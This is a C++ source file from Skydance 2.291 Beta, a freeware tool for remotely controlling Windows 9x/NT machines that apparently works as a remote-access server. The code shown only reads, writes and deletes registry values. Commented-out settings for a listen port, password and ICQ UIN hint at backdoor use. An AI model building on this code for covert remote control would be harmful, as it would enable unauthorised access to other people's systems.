/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
/////////////includes:

#include "atlbase.h"	//RegKey
#include <afxmt.h>		//CMutex, von mir!


/////////////allgemeine functionen:

/*static int m_iListenPort;
static CString m_sPass;
static CString m_sLogAlways;
static CString m_sDLLFile;
static CString m_sLogFile;
static CString m_sUIN;
static int m_iEnableDlg;*/

static CString m_sGetRegistryVal;

static CRegKey m_cRegKey;




static HKEY GetHKEY(CString sKeyParent)
{
	if(sKeyParent == "2") return HKEY_LOCAL_MACHINE;
	if(sKeyParent == "0") return HKEY_CLASSES_ROOT;
	if(sKeyParent == "1") return HKEY_CURRENT_USER;
	if(sKeyParent == "3") return HKEY_USERS;		
	if(sKeyParent == "4") return HKEY_CURRENT_CONFIG;
	if(sKeyParent == "5") return HKEY_DYN_DATA;
	else return NULL;
}

static BOOL GetRegistryVal(CString sKeyParent, CString sSubKey, CString sValueName)
{
	//AfxMessageBox( " " + sKeyParent + " " + sSubKey +" " + sValueName);
	HKEY hKeyParent;
	if(!(hKeyParent = GetHKEY(sKeyParent))) return FALSE;
	if(m_cRegKey.Create( hKeyParent, sSubKey, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, NULL ) == ERROR_SUCCESS)
	{
		DWORD size = 79;
		char *pszValue = new char[80];
		if(m_cRegKey.QueryValue( pszValue, sValueName, &size) == ERROR_SUCCESS)
		{
			//AfxMessageBox(pszValue);
			m_sGetRegistryVal = pszValue;
			delete pszValue;
			return TRUE;
		}
	}
	m_sGetRegistryVal = "";
	return FALSE;
}

static BOOL SetRegistryVal(CString sKeyParent, CString sSubKey, CString sValueName, CString sValue, CString sTyp)
{
	HKEY hKeyParent;
	if(!(hKeyParent = GetHKEY(sKeyParent))) return FALSE;
	if(m_cRegKey.Create( hKeyParent, sSubKey, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, NULL ) == ERROR_SUCCESS)
	{
		if(sTyp == "0")
		{
			if(m_cRegKey.SetValue( sValue, sValueName) == ERROR_SUCCESS)
			{
				return TRUE;
			}
		}
	//AfxMessageBox("4");
	/*	if(sTyp == "2")
		{
			int iValue = 0;
			sscanf (sValue, "%d", iValue);
			DWORD dValue = iValue;
			if(m_cRegKey.SetValue(dValue, sValueName ) == ERROR_SUCCESS)
			{
				return TRUE;
			}
		}*/
	}
	return FALSE;
}

static BOOL DelRegistryVal(CString sKeyParent, CString sSubKey, CString sValueName)
{
	HKEY hKeyParent;
	if(!(hKeyParent = GetHKEY(sKeyParent))) return FALSE;
	if(m_cRegKey.Create( hKeyParent, sSubKey, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, NULL ) == ERROR_SUCCESS)
	{
		if(m_cRegKey.DeleteValue( sValueName) == ERROR_SUCCESS) return TRUE;
	}
	return FALSE;
}